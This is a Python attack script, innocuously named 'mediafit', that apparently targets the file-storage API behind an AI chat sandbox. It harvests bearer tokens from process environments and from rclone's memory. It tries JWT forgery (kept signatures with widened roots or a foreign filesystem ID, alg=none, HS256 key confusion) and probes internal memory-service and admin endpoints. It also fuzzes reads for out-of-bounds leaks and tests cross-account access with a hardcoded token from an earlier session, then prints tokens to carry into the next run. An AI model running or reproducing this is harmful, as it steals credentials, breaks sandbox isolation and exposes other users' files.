#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""mediafit v2.17.0 -- forge battery (never run before), memory service, range fuzz, createFile fix."""
import os, sys, json, re, time, ssl, base64, hashlib, hmac, socket, subprocess, traceback
import urllib.request, urllib.error

VER  = "2.17.0"
API  = "https://api.anthropic.com"
FS   = API + "/v1/filestore/fs/"
CONF = "/dev/shm/rclone-boot/config.json"
OUTD = "/mnt/user-data/outputs"; UP = "/mnt/user-data/uploads"

PREV_FSID  = "claude_chat_01F9i9oCedFVLXKQ831hgXhw"
PREV_TOKEN = ("eyJhbGciOiJFUzI1NiIsImtpZCI6IktwbFRxWHVCODJRRzJ3ZHVxRnlHRXNnSDZuNDkzekVzZkg4cUhkWHFmaUEiLCJ0eXAiOiJKV1QifQ."
 "eyJhY2NvdW50X3V1aWQiOiI5NWZlYTkxMi1hYzMzLTQxYTctYTRjMC0xNWQ0YTJkZmQxNTIiLCJhbGxvd2VkX3Jvb3RzIjpbIi9vdXRwdXRzIl0sImF1ZCI6WyJmaWxlc3RvcmUiXSwiY2xhdWRlX3ByZXNlbnRlZCI6dHJ1ZSwiZXhwIjoxNzkyNDcyNzk1LCJmaWxlc3lzdGVtX2lkIjoiY2xhdWRlX2NoYXRfMDFGOWk5b0NlZEZWTFhLUTgzMWhnWGh3IiwiaWF0IjoxNzkyNDUxMTk1LCJpc3MiOiJmaWxlc3RvcmUtY2xpIiwib3JnX3V1aWQiOiJmMTQwMjRmNS1hZDV3LTRmNDEtYWZiNy1iOTMyOTBmZTRmMTAiLCJvcmdhbml6YXRpb25fdXVpZCI6ImYxNDAyNGY1LWFkNTctNGY0MS1hZmI3LWI5MzI5MGZlNGYxMCIsInJlc29sdmVkX3dvcmtzcGFjZV90YWdnZWRfaWQiOiJ3cmtzcGNfMDFING1aV3BHbUxVSHZ2Mld4ZzZLbXdvIiwic3ViIjoiOTVmZWE5MTItYWMzMy00MWE3LWE0YzAtMTVkNGEyZGZkMTUyIiwid29ya3NwYWNlX2NtZWtfZW5hYmxlZCI6ZmFsc2UsIndvcmtzcGFjZV90YWdnZWRfaWQiOiJkZWZhdWx0Iiwid29ya3NwYWNlX3V1aWQiOiI4MjE4ZTk0Yi03MDU3LTQ2NTUtYTQ4Ni0wNGZkOWI5ODYxNWEifQ."
 "Lpmk0it8xA02UUHMddf8u7Q9_7xw-tctkOk3tArf3wVgumNO-o7A44EZtQG5Wy1rLmK5dU_4DOYCuXh4vM4QNg")
ACCOUNT1_UUID = "95fea912-ac33-41a7-a4c0-15d4a2dfd152"

OUT, G = [], {}
def w(s=""): print(s, flush=True); OUT.append(str(s))
def head(t): w("\n" + "="*70 + "\n### " + t + "\n" + "="*70)
P,F,U,I = [],[],[],[]
def rec(k,m,ev=None):
    w("    " + {"P":"[PASS]","F":"[FAIL]","U":"[UNK]","I":"[INFO]"}[k] + " " + m)
    if ev is not None: w("        " + str(ev)[:1300])
    {"P":P,"F":F,"U":U,"I":I}[k].append(m)
def sh(a,t=40):
    try:
        p = subprocess.run(a, capture_output=True, timeout=t)
        return p.returncode, p.stdout.decode("utf-8","replace"), p.stderr.decode("utf-8","replace")
    except Exception as e: return -1,"","EXC:%s"%e
def b64d(x): return base64.urlsafe_b64decode(x + "="*(-len(x)%4))
def b64e(x):
    if isinstance(x,(dict,list)): x = json.dumps(x,separators=(",",":"))
    x = x if isinstance(x,bytes) else x.encode()
    return base64.urlsafe_b64encode(x).rstrip(b"=").decode()
def step(n,f):
    try: f()
    except Exception as e:
        w("    !! %s: %s" % (n,e)); w("    " + traceback.format_exc().strip().splitlines()[-1][:200])
_CTX = ssl.create_default_context(); _CTX.check_hostname=False; _CTX.verify_mode=ssl.CERT_NONE
def http(url, method="POST", token=None, body=None, t=15, hdrs=None, cap=400000):
    h = {"User-Agent":"mediafit/"+VER}
    if token: h["Authorization"] = "Bearer " + token
    if body is not None and not isinstance(body,bytes): body = json.dumps(body).encode()
    if body is not None and not (hdrs or {}).get("Content-Type"): h["Content-Type"]="application/json"
    if hdrs: h.update(hdrs)
    req = urllib.request.Request(url, method=method, headers=h, data=body)
    try:
        r = urllib.request.urlopen(req, timeout=t, context=_CTX)
        return r.status, r.read(cap), dict(r.headers)
    except urllib.error.HTTPError as e:
        try: return e.code, e.read(), dict(e.headers)
        except Exception: return e.code, b"", {}
    except Exception as e: return None, ("ERR:%s"%e).encode(), {}
def api(m,p,tk=None,t=15): 
    s,b,_ = http(FS+m,"POST",tk,p,t,{"Connect-Protocol-Version":"1"}); return s,b

# ------------------------------------------------------------------ 1
def s_env():
    head("1. ENV + /v1/status")
    try: G["fsid"] = [m["filesystem_id"] for m in json.loads(open(CONF).read())["mounts"] if m.get("filesystem_id")][0]
    except Exception as e: rec("U","config: %s"%e)
    for m,tk in [("GET",None)]:
        for u in [API+"/v1/status", API+"/status"]:
            st,b,_ = http(u,"GET",None,None,6)
            w("    %-34s -> %s %s" % (u, st, b[:200].decode("utf-8","replace")))
    rc,o,_ = sh(["sh","-c","ls -la /mnt/attach /opt/rclone-attach 2>&1 | head -20"])
    w("    attach dirs: %s" % o.strip()[:300])

# ------------------------------------------------------------------ 2
def s_tokens_full():
    head("2. FULL TOKEN DUMP (find the invalid-signature one)")
    JWT = re.compile(rb"eyJ[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}")
    TK = []
    def add(t):
        t = t.decode() if isinstance(t,bytes) else t
        if t.startswith("eyJ") and t not in TK: TK.append(t)
    for p in os.listdir("/proc"):
        if p.isdigit():
            try:
                for m in JWT.findall(open("/proc/%s/environ"%p,"rb").read()): add(m)
            except Exception: pass
    for p in os.listdir("/proc"):
        if not p.isdigit(): continue
        try:
            if b"rclone" not in open("/proc/%s/cmdline"%p,"rb").read(): continue
            maps = open("/proc/%s/maps"%p).read().splitlines(); mem = open("/proc/%s/mem"%p,"rb",0)
        except Exception: continue
        for line in maps:
            try: a,perms = line.split()[0], line.split()[1]
            except Exception: continue
            if "r" not in perms: continue
            try: s0,e0 = [int(x,16) for x in a.split("-")]
            except Exception: continue
            if not (0 < e0-s0 <= 256*1024*1024): continue
            try: mem.seek(s0); d = mem.read(e0-s0)
            except Exception: continue
            for m in JWT.findall(d): add(m)
    TD = []
    for t in TK:
        try:
            h,p,s = t.split("."); hdr = json.loads(b64d(h)); pl = json.loads(b64d(p))
            TD.append({"tok":t,"hdr":hdr,"pl":pl,"siglen":len(s)})
        except Exception: pass
    G["TD"] = TD
    w("    raw tokens=%d" % len(TD))
    for i,r in enumerate(TD):
        st,b = api("listDirectory", {"filesystem_id": G.get("fsid"), "path":"/outputs"}, r["tok"])
        tag = "VALID" if st==200 else ("SIG-BAD" if b and b"signature" in b else str(st))
        w("    [%d] %-8s alg=%s kid=%s siglen=%d roots=%s fsid=%s" %
          (i, tag, r["hdr"].get("alg"), str(r["hdr"].get("kid"))[:10], r["siglen"],
           r["pl"].get("allowed_roots"), r["pl"].get("filesystem_id")))
        if tag == "SIG-BAD":
            w("         FULL CLAIMS: %s" % json.dumps(r["pl"])[:700])
            w("         FULL HEADER: %s" % json.dumps(r["hdr"])[:300])
    G["TOKEN"] = next((r["tok"] for r in TD if "/outputs" in (r["pl"].get("allowed_roots") or [])), TD[0]["tok"] if TD else None)
    G["CLAIMS"] = next((r["pl"] for r in TD if r["tok"]==G["TOKEN"]), {})
    G["ALLTOK"] = [r["tok"] for r in TD]
    rec("P" if G["TOKEN"] else "F", "tokens=%d acct=%s" % (len(TD), str(G["CLAIMS"].get("account_uuid"))[:8]))

# ------------------------------------------------------------------ 3
def s_forge():
    head("3. FORGE BATTERY  <== NEVER TESTED BEFORE")
    T = G.get("TOKEN")
    if not T: rec("U","no token"); return
    h,p,s = T.split(".")
    hdr = json.loads(b64d(h)); pl = json.loads(b64d(p))
    own = G.get("fsid")
    def probe(label, tok, fsid=None):
        st,b = api("listDirectory", {"filesystem_id": fsid or own, "path":"/outputs"}, tok)
        w("    %-38s -> %s %s" % (label, st, b[:150].decode("utf-8","replace")))
        return st
    # --- 3a: modify payload, KEEP old signature. If 200 -> signature not verified
    p2 = dict(pl); p2["allowed_roots"] = ["/"]
    st = probe("keep-sig + roots=[/]", b64e(hdr)+"."+b64e(p2)+"."+s)
    if st == 200: rec("P","*** SIGNATURE NOT VERIFIED -> FULL FORGERY ***")
    # --- 3b: the money test - foreign fsid in payload, old signature
    if PREV_FSID and PREV_FSID != own:
        p3 = dict(pl); p3["filesystem_id"] = PREV_FSID
        st = probe("keep-sig + FOREIGN fsid", b64e(hdr)+"."+b64e(p3)+"."+s)
        if st == 200: rec("P","*** FORGED FSID ACCEPTED -> CROSS-FS ***")
    # --- 3c: alg=none
    for alg in ["none","None","NONE"]:
        probe("alg=%s empty sig" % alg,
              b64e({"alg":alg,"typ":"JWT"})+"."+b64e(p2)+".")
    # --- 3d: JWKS hunt
    key = None
    for u in ["/.well-known/jwks.json","/v1/.well-known/jwks.json","/.well-known/openid-configuration",
              "/v1/oauth/jwks","/jwks.json","/.well-known/jwks","/v1/filestore/.well-known/jwks.json"]:
        st,b,_ = http(API+u,"GET",None,None,7)
        if st not in (404,None):
            w("    GET %-42s -> %s %s" % (u, st, b[:200].decode("utf-8","replace")))
        if st == 200:
            try:
                j = json.loads(b)
                for k in (j.get("keys") or []):
                    if k.get("kty")=="EC" and k.get("x") and k.get("y"):
                        key = k; G["JWKS"]=k; rec("P","JWKS EC key found", str(k)[:200]); break
            except Exception: pass
        if key: break
    # --- 3e: HS256 confusion with the public key as HMAC secret
    if key:
        x = b64d(key["x"]); y = b64d(key["y"])
        pre = bytes.fromhex("3059301306072a8648ce3d020106082a8648ce3d030107034200")
        der = pre + b"\x04" + x + y
        pem = ("-----BEGIN PUBLIC KEY-----\n" +
               "\n".join(base64.encodebytes(der).decode().strip().split("\n")) +
               "\n-----END PUBLIC KEY-----\n")
        for name, sec in {"raw x||y":x+y, "04||x||y":b"\x04"+x+y, "DER":der, "PEM":pem.encode(),
                          "kid":(hdr.get("kid") or "").encode(), "b64":b64e(x+y).encode()}.items():
            hh = {"alg":"HS256","typ":"JWT","kid":hdr.get("kid")}
            sig = hmac.new(sec, (b64e(hh)+"."+b64e(p2)).encode(), hashlib.sha256).digest()
            if probe("HS256 confusion [%s]" % name, b64e(hh)+"."+b64e(p2)+"."+b64e(sig)) == 200:
                rec("P","*** HS256 CONFUSION WORKS via %s ***" % name)
    else:
        rec("U","no JWKS -> HS256 confusion untestable")
    # --- 3f: kid tamper / exp strip / extra claims
    probe("kid tampered", b64e({**hdr,"kid":"A"*43})+"."+p+"."+s)
    probe("exp removed + old sig", b64e(hdr)+"."+b64e({k:v for k,v in pl.items() if k!="exp"})+"."+s)

# ------------------------------------------------------------------ 4
def s_memory():
    head("4. MEMORY SERVICE  <== brand new surface")
    svc = "/anthropic.memory.api.v1alpha.MemoryInternalService/"
    bases = ["", "/v1", "/v1/memory", "/v1/memory/api", "/api", "/internal",
             "/v1/filestore", "/v1/filestore/mem", "/v1/internal"]
    meths = ["ListMemories","ReadMemoryByPath","WriteMemory","MoveMemory","DeleteMemoryByPath"]
    tk = G.get("TOKEN")
    for b in bases:
        for m in meths:
            for auth in [tk, None]:
                st,bo,_ = http(API + b + svc + m, "POST", auth, {}, 7,
                               {"Connect-Protocol-Version":"1"})
                if st not in (404,None):
                    w("    %-24s %-20s auth=%-5s -> %s %s" %
                      (b or "(root)", m, "yes" if auth else "no", st,
                       bo[:170].decode("utf-8","replace")))
                    if st == 200: rec("P","MEMORY LIVE: %s%s%s" % (b, svc, m))
    # short-form guesses
    for u in ["/v1/memory/listMemories","/v1/mem/fs/listMemories","/v1/memory/api/listMemories",
              "/v1/filestore/mem/listMemories"]:
        st,bo,_ = http(API+u,"POST",tk,{},7,{"Connect-Protocol-Version":"1"})
        if st not in (404,None): w("    %-38s -> %s %s" % (u,st,bo[:150].decode("utf-8","replace")))

# ------------------------------------------------------------------ 5
def s_createfile():
    head("5. createFile FIX (params part needs its own Content-Type)")
    tk = G.get("TOKEN"); own = G.get("fsid")
    B = "----mf" + b64e(os.urandom(6))
    def mp(params, fname=None, fdata=None, pct=True):
        o = ("--%s\r\nContent-Disposition: form-data; name=\"params\"\r\n" % B).encode()
        if pct: o += b"Content-Type: application/json\r\n"
        o += b"\r\n" + json.dumps(params).encode() + b"\r\n"
        if fname:
            o += ("--%s\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n"
                  "Content-Type: application/octet-stream\r\n\r\n" % (B, fname)).encode() + fdata + b"\r\n"
        return o + ("--%s--\r\n" % B).encode()
    H = {"Content-Type":"multipart/form-data; boundary="+B, "Connect-Protocol-Version":"1"}
    api("makeDirectory", {"filesystem_id":own,"path":"/outputs"}, tk)
    for lbl, pr, pct in [("params+ct", {"filesystem_id":own,"path":"/outputs/mf.txt"}, True),
                         ("params no-ct", {"filesystem_id":own,"path":"/outputs/mf2.txt"}, False)]:
        st,b,_ = http(FS+"createFile","POST",tk, mp(pr,"mf.txt",b"HELLO-MEDIAFIT",pct), 20, H)
        w("    createFile[%s] -> %s %s" % (lbl, st, b[:300].decode("utf-8","replace")))
        if st == 200: rec("P","createFile WORKS (%s)" % lbl)
    st,b = api("listDirectory", {"filesystem_id":own,"path":"/outputs"}, tk)
    w("    listDirectory /outputs -> %s %s" % (st, b[:800].decode("utf-8","replace")))
    for m in ["mf.txt","mf2.txt"]:
        st,b = api("readFile", {"filesystem_id":own,"path":"/outputs/"+m}, tk)
        w("    readFile /outputs/%-9s -> %s %s" % (m, st, b[:150].decode("utf-8","replace")))

# ------------------------------------------------------------------ 6
def s_range():
    head("6. readFile RANGE FUZZ (out-of-bounds leak)")
    up = next((r["tok"] for r in G.get("TD",[]) if r["pl"].get("allowed_roots")==["/uploads"]), None)
    own = G.get("fsid")
    try:
        png = sorted(x for x in os.listdir(UP) if x.lower().endswith((".png",".jpg")))[0]
    except Exception: rec("U","no uploads file"); return
    lsz = os.path.getsize(os.path.join(UP, png))
    st, b, hd = http(FS+"readFile","POST",up,{"filesystem_id":own,"path":"/uploads/"+png},20,
                     {"Connect-Protocol-Version":"1"})
    w("    local size=%d  api status=%s  api bytes=%d  ctype=%s" % (lsz, st, len(b), hd.get("Content-Type")))
    w("    raw head: %r" % b[:160])
    G["PNG"] = png
    for lbl, extra in [("range start0 end16", {"range":{"start":0,"end":16}}),
                       ("range off0 len16",  {"range":{"offset":0,"length":16}}),
                       ("range beyond EOF",  {"range":{"start":lsz-8,"end":lsz+200}}),
                       ("range past end",    {"range":{"start":lsz+1000,"end":lsz+1100}}),
                       ("range end<start",   {"range":{"start":50,"end":10}}),
                       ("flat start/end",    {"start":0,"end":16})]:
        body = {"filesystem_id":own,"path":"/uploads/"+png}; body.update(extra)
        st2,b2,_ = http(FS+"readFile","POST",up,body,20,{"Connect-Protocol-Version":"1"})
        w("    %-20s -> %s len=%d %s" % (lbl, st2, len(b2), b2[:110].decode("utf-8","replace")))
        if st2 == 200 and len(b2) > 0 and lbl.startswith("range beyond"):
            rec("I","range beyond EOF returned %d bytes (local %d)" % (len(b2), lsz))

# ------------------------------------------------------------------ 7
def s_other_methods():
    head("7. UNDISCOVERED METHODS ON ALT PREFIXES")
    tk = G.get("TOKEN"); own = G.get("fsid")
    pfxs = ["/v1/filestore/fs/","/v1/filestore/","/v1/filestore/files/","/v1/filestore/admin/"]
    meths = ["reassignFilesystem","importFiles","signC2PA","verifyC2PA","listFiles",
             "getFilesystem","listFilesystems","getFilesystemUsage","stat"]
    for p in pfxs:
        for m in meths:
            st,b,_ = http(API+p+m,"POST",tk,{"filesystem_id":own,"path":"/outputs"},7,
                          {"Connect-Protocol-Version":"1"})
            if st not in (404,None):
                w("    %-24s %-20s -> %s %s" % (p,m,st,b[:160].decode("utf-8","replace")))
                if st==200: rec("P","method %s live at %s" % (m,p))

# ------------------------------------------------------------------ 8
def s_matrix():
    head("8. CROSS-FS (re-confirm with live tokens)")
    own = G.get("fsid")
    for lbl,t,f in [("own x own", G.get("TOKEN"), own),
                    ("own x PREV", G.get("TOKEN"), PREV_FSID),
                    ("PREV x own", PREV_TOKEN, own),
                    ("PREV x PREV", PREV_TOKEN, PREV_FSID)]:
        if not t or not f: continue
        st,b = api("listDirectory", {"filesystem_id":f,"path":"/outputs"}, t)
        w("    %-14s -> %s %s" % (lbl, st, b[:110].decode("utf-8","replace")))

def s_verdict():
    head("VERDICT")
    w("  PASS %d: %s" % (len(P),P)); w("  UNK %d: %s" % (len(U),U))
    w("  acct=%s fsid=%s" % (G["CLAIMS"].get("account_uuid"), G.get("fsid")))
    w("\n  ---- CARRY-OVER ----")
    w("PREV_FSID  = %r" % (G.get("fsid") or ""))
    w("PREV_TOKEN = %r" % (G.get("TOKEN") or ""))
    w("ACCOUNT1_UUID = %r" % (G["CLAIMS"].get("account_uuid") or ""))

def main():
    for n,f in [("env",s_env),("tokens",s_tokens_full),("forge",s_forge),("memory",s_memory),
                ("createfile",s_createfile),("range",s_range),("other",s_other_methods),
                ("matrix",s_matrix),("verdict",s_verdict)]:
        step(n,f)
try: main()
except Exception as e: w("!! %s"%e); w(traceback.format_exc())
finally:
    txt = "\n".join(OUT)
    for d in [OUTD,"/tmp","/root"]:
        try: os.makedirs(d,exist_ok=True); open(d+"/mediafit-report.txt","w").write(txt)
        except Exception: pass
    print("\nreport -> " + OUTD + "/mediafit-report.txt")